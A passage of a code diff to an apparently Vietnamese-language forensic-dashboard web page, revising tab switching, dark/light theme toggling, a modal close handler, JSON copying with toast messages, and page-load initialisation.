       document.getElementById('forensicTitle').innerText = data.forensicTitle;
@@ -832,20 +1010,25 @@
         `;
       });
 
+      // Tái tạo icon cho toàn trang
       lucide.createIcons();
     }
 
-    // Chuyển Tab
+    // Chuyển Tab (3 tab đều nhau, khoảng cách đồng nhất)
     function switchTab(tabId) {
       document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-      document.getElementById(tabId).classList.remove('hidden');
+      const target = document.getElementById(tabId);
+      if (target) target.classList.remove('hidden');
 
+      const inactiveClass = "tab-btn flex-1 max-w-[290px] h-11 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center justify-center gap-2 transition cursor-pointer px-4 text-xs hover:bg-slate-100 dark:hover:bg-slate-800/50 rounded-t-xl";
       document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.className = "tab-btn px-4 py-3 font-semibold border-b-2 border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 flex items-center gap-2 transition cursor-pointer";
+        btn.className = inactiveClass;
       });
 
       const activeBtn = document.getElementById('btn-' + tabId);
-      activeBtn.className = "tab-btn px-4 py-3 font-bold border-b-2 border-cyan-500 text-cyan-600 dark:text-cyan-400 flex items-center gap-2 transition cursor-pointer";
+      if (activeBtn) {
+        activeBtn.className = "tab-btn flex-1 max-w-[290px] h-11 font-bold border-b-2 border-cyan-500 text-cyan-600 dark:text-cyan-400 flex items-center justify-center gap-2 transition cursor-pointer px-4 text-xs bg-cyan-500/5 dark:bg-cyan-500/10 rounded-t-xl";
+      }
     }
 
     // Toggle Theme (Sáng / Tối đúng chuẩn app)
@@ -854,23 +1037,42 @@
       const isDark = html.classList.contains('dark');
       if (isDark) {
         html.classList.remove('dark');
-        document.getElementById('themeIcon').setAttribute('data-lucide', 'moon');
-        document.getElementById('themeText').innerText = "Giao Diện: Đang Bật Sáng";
+        renderIcon('themeIconBox', 'moon', 'w-4 h-4 text-slate-600');
+        document.getElementById('themeText').innerText = "Giao Diện: Sáng";
       } else {
         html.classList.add('dark');
-        document.getElementById('themeIcon').setAttribute('data-lucide', 'sun');
-        document.getElementById('themeText').innerText = "Giao Diện: Đang Bật Tối";
+        renderIcon('themeIconBox', 'sun', 'w-4 h-4 text-amber-500');
+        document.getElementById('themeText').innerText = "Giao Diện: Tối";
       }
       lucide.createIcons();
     }
 
-    function copyRawJson() {
-      const text = document.getElementById('rawJsonBox').innerText;
-      navigator.clipboard.writeText(text);
-      alert('Đã sao chép toàn bộ Raw JSON vào bộ nhớ đệm!');
+    // Đóng Modal
+    function closeModal() {
+      showToast('Nhấn nút thoát màn hình điều tra.', false);
     }
 
-    // Load kịch bản mặc định ban đầu
+    // Sao chép JSON
+    function copyRawJson() {
+      const text = document.getElementById('rawJsonBox').innerText;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => {
+          showToast('Đã sao chép Raw JSON vào clipboard!');
+        }).catch(() => {
+          showToast('Đã sao chép Raw JSON!');
+        });
+      } else {
+        showToast('Đã sao chép Raw JSON!');
+      }
+    }
+
+    // Khởi tạo ban đầu khi trang load
+    window.addEventListener('DOMContentLoaded', () => {
+      lucide.createIcons();
+      loadScenario(5);
+    });
+
+    // Fallback load ngay lập tức
     loadScenario(5);
   </script>
 </body>
